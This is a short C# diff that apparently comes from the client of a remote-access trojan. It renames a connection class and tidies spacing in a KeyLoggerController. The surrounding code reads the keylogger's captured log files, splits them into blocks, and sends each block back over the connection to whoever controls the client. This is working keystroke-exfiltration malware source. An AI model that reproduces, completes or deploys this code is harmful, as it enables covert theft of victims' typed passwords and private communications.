@@ -13,7 +13,7 @@ namespace Client.Controllers
 {
     public static class KeyLoggerController
     {
-        public static void getKeyLogger(GetKeyLoggerLogs packet, ClientMosaic client)
+        public static void getKeyLogger(GetKeyLoggerLogs packet, ClientMosaique client)
         {
             new Thread(() =>
             {
@@ -29,25 +29,25 @@ namespace Client.Controllers
 
                     FileInfo[] iFiles = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();
 
-                    if(iFiles.Length == 0)
+                    if (iFiles.Length == 0)
                     {
                         new GetKeyLoggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                         return;
                     }
 
-                    foreach(FileInfo file in iFiles)
+                    foreach (FileInfo file in iFiles)
                     {
                         FileSplit srcFile = new FileSplit(file.FullName);
 
-                        if(srcFile.MaxBlocks < 0)
+                        if (srcFile.MaxBlocks < 0)
                         {
                             new GetKeyLoggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
                         }
 
-                        for(int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                         {
                             byte[] block;
-                            if(srcFile.ReadBlock(currentBlock, out block))
+                            if (srcFile.ReadBlock(currentBlock, out block))
                             {
                                 new GetKeyLoggerLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
                             }
